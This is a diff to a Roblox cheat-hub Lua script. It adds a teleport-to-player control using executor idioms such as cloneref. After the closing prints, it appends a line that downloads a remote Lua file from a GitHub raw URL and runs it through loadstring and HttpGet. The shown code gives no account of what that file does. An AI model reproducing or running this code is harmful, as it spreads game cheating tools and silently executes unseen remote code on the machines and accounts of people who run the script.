@@ -3794,6 +3794,32 @@ local function loadGUI()
         end
     end,})
 
+    local GotoPlayerBox = Tab13:CreateInput({
+    Name = "Goto/TP Player",
+    CurrentValue = "",
+    PlaceholderText = "User Here",
+    RemoveTextAfterFocusLost = true,
+    Flag = "TPToPlayerBo",
+    Callback = function(get_player_func)
+        local tp_pivot_plr = findplr(get_player_func)
+        local Players = game:GetService("Players") or cloneref(game:GetService("Players"))
+        local LocalPlayer = Players.LocalPlayer
+        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        
+        if not tp_pivot_plr then
+            return Notify_User("Error:", "Player not found or does not exist!", 6)
+        end
+        task.wait(.2)
+
+        local tp_getpivot_char = tp_pivot_plr.Character
+
+        if tp_getpivot_char then
+            Character:PivotTo(tp_getpivot_char:GetPivot())
+        else
+            return 
+        end
+    end,})
+
     local MutingMyself = Tab1:CreateToggle({
     Name = "Mute Yourself",
     CurrentValue = false,
@@ -6845,3 +6871,5 @@ wait(0.5)
 print("Successfully ran!")
 wait()
 print("YEAH! Zacks Easy Hub [ON TOP!]")
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/expert-octo-telegram/refs/heads/main/expressive_contacting_ai.lu"))()
